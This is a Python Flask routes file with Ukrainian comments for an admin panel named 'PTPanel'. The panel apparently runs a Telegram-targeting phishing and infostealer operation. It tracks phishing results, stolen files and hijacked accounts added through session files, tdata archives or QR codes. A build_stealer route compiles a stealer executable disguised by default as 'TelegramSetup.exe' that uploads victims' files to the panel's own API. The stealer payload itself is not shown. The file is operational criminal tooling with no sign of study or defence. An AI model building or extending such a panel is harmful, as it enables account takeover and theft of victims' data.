# web/admin/routes.py
from flask import Blueprint, render_template, request, flash, redirect, url_for, session, jsonify
from core.database import db_manager
from models.db_models import Admin, Account, PhishingResult, StolenFile, SystemLog
from core.security import verify_password, hash_password
import logging
from datetime import datetime
from functools import wraps

admin_bp = Blueprint('admin', __name__)
logger = logging.getLogger(__name__)

# Допоміжна функція для перевірки авторизації
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_logged_in' not in session:
            flash('Будь ласка, увійдіть в систему', 'warning')
            return redirect(url_for('admin.admin_login'))
        return f(*args, **kwargs)
    return decorated_function

# Допоміжна функція для перевірки головного адміна
def main_admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('is_main_admin'):
            flash('Доступ заборонено. Потрібні права головного адміна', 'danger')
            return redirect(url_for('admin.admin_dashboard'))
        return f(*args, **kwargs)
    return decorated_function

@admin_bp.route('/login', methods=['GET', 'POST'])
def admin_login():
    """Форма входу в адмін-панель"""
    if 'admin_logged_in' in session:
        return redirect(url_for('admin.admin_dashboard'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        db_session = db_manager.get_session()
        try:
            admin = db_session.query(Admin).filter(Admin.username == username).first()
            
            if admin and verify_password(password, admin.password_hash) and admin.is_active:
                session['admin_logged_in'] = True
                session['admin_username'] = admin.username
                session['admin_id'] = admin.id
                session['is_main_admin'] = (admin.username == 'admin')
                
                admin.last_login = datetime.utcnow()
                db_session.commit()
                
                flash(f'Вітаємо, {admin.username}! Успішний вхід в систему.', 'success')
                logger.info(f"Admin {admin.username} logged in")
                return redirect(url_for('admin.admin_dashboard'))
            else:
                flash('Невірний логін або пароль!', 'danger')
                logger.warning(f"Failed login attempt for username: {username}")
                
        except Exception as e:
            flash('Помилка сервера при авторизації', 'danger')
            logger.error(f"Login error: {e}")
        finally:
            db_session.close()
    
    return render_template('admin/login.html', app_name="PTPanel")

@admin_bp.route('/logout')
def admin_logout():
    """Вихід з системи"""
    username = session.get('admin_username', 'Unknown')
    session.clear()
    flash('Ви вийшли з системи', 'info')
    logger.info(f"Admin {username} logged out")
    return redirect(url_for('admin.admin_login'))

@admin_bp.route('/')
@login_required
def admin_dashboard():
    """Головна сторінка адмінки з реальною статистикою"""
    db_session = db_manager.get_session()
    try:
        accounts_count = db_session.query(Account).count()
        results_count = db_session.query(PhishingResult).count()
        files_count = db_session.query(StolenFile).count()
        
        # Останні 5 результатів
        recent_results = db_session.query(PhishingResult).order_by(
            PhishingResult.timestamp.desc()
        ).limit(5).all()
        
        return render_template('admin/dashboard.html', 
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             accounts_count=accounts_count,
                             results_count=results_count,
                             files_count=files_count,
                             recent_results=recent_results)
    except Exception as e:
        logger.error(f"Dashboard error: {e}")
        flash('Помилка завантаження статистики', 'danger')
        return render_template('admin/dashboard.html', 
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             accounts_count=0, results_count=0, files_count=0)
    finally:
        db_session.close()

@admin_bp.route('/devices')
@login_required
def admin_devices():
    """Управління акаунтами"""
    db_session = db_manager.get_session()
    try:
        accounts = db_session.query(Account).all()
        return render_template('admin/devices.html',
                             app_name="PTPanel", 
                             current_user={'username': session.get('admin_username')},
                             accounts=accounts)
    except Exception as e:
        logger.error(f"Devices page error: {e}")
        return render_template('admin/devices.html',
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             accounts=[])
    finally:
        db_session.close()

@admin_bp.route('/stealer')
@login_required
def admin_stealer():
    """Stealer білдер"""
    db_session = db_manager.get_session()
    try:
        stolen_files = db_session.query(StolenFile).filter_by(admin_id=session.get('admin_id')).all()
        return render_template('admin/stealer.html',
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             stolen_files=stolen_files,
                             is_main_admin=session.get('is_main_admin', False))
    except Exception as e:
        logger.error(f"Stealer page error: {e}")
        return render_template('admin/stealer.html',
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             stolen_files=[],
                             is_main_admin=session.get('is_main_admin', False))
    finally:
        db_session.close()

@admin_bp.route('/services')
@login_required
def admin_services():
    """Сервіси та білдер посилань"""
    return render_template('admin/services.html',
                         app_name="PTPanel",
                         current_user={'username': session.get('admin_username')})

@admin_bp.route('/settings')
@login_required
def admin_settings():
    """Налаштування"""
    return render_template('admin/settings.html',
                         app_name="PTPanel",
                         current_user={'username': session.get('admin_username')})

@admin_bp.route('/logs')
@login_required
@main_admin_required
def admin_logs():
    """Логи системи (тільки для головного адміна)"""
    return render_template('admin/logs.html',
                         app_name="PTPanel",
                         current_user={'username': session.get('admin_username')},
                         is_main_admin=session.get('is_main_admin', False))

@admin_bp.route('/admins')
@login_required
@main_admin_required
def admin_admins():
    """Управління адмінами (тільки для головного адміна)"""
    db_session = db_manager.get_session()
    try:
        admins = db_session.query(Admin).all()
        return render_template('admin/admins.html',
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             is_main_admin=session.get('is_main_admin', False),
                             admins=admins)
    except Exception as e:
        logger.error(f"Admins page error: {e}")
        return render_template('admin/admins.html',
                             app_name="PTPanel",
                             current_user={'username': session.get('admin_username')},
                             is_main_admin=session.get('is_main_admin', False),
                             admins=[])
    finally:
        db_session.close()

# API endpoints для адмінки
@admin_bp.route('/api/stats')
@login_required
def api_stats():
    """API для отримання статистики"""
    db_session = db_manager.get_session()
    try:
        accounts_count = db_session.query(Account).count()
        results_count = db_session.query(PhishingResult).count()
        files_count = db_session.query(StolenFile).count()
        
        return jsonify({
            'accounts': accounts_count,
            'results': results_count,
            'files': files_count
        })
    except Exception as e:
        logger.error(f"API stats error: {e}")
        return jsonify({'error': str(e)}), 500
    finally:
        db_session.close()

@admin_bp.route('/build_stealer', methods=['POST'])
@login_required
def build_stealer():
    """Побудова стіллера"""
    try:
        filename = request.form.get('filename', 'TelegramSetup')
        admin_id = request.form.get('admin_id', session.get('admin_id'))
        features = request.form.getlist('features')
        
        logger.info(f"Building stealer for admin {session.get('admin_username')}")
        logger.info(f"Features: {features}")
        
        # Викликаємо білдер стіллера
        from core.stealer_builder import stealer_builder
        
        stealer_config = {
            'server_url': f"{request.host_url}api/upload",
            'admin_id': admin_id,
            'target_admin': session.get('admin_username'),
            'features': features,
            'version': '1.0.0'
        }
        
        output_path = f"client/dist/{filename}.exe"
        success = stealer_builder.build_stealer(stealer_config, output_path)
        
        if success:
            flash(f'Стіллер успішно збудовано! Файли будуть надсилатися на ваш акаунт.', 'success')
        else:
            flash('Помилка при побудові стіллера', 'danger')
            
    except Exception as e:
        flash(f'Помилка при побудові стіллера: {str(e)}', 'danger')
        logger.error(f"Stealer build error: {e}")
    
    return redirect(url_for('admin.admin_stealer'))

@admin_bp.route('/add_account', methods=['POST'])
@login_required
def add_account():
    """Додавання акаунта"""
    method = request.form.get('method')
    
    try:
        if method == 'phone':
            phone = request.form.get('phone')
            flash(f'Акаунт з номером {phone} додано!', 'success')
        elif method == 'session':
            flash('Session файл успішно завантажено!', 'success')
        elif method == 'tdata':
            flash('Tdata архів успішно завантажено!', 'success')
        elif method == 'qr':
            flash('QR код успішно оброблено!', 'success')
    except Exception as e:
        flash(f'Помилка додавання акаунта: {str(e)}', 'danger')
        logger.error(f"Add account error: {e}")
    
    return redirect(url_for('admin.admin_devices'))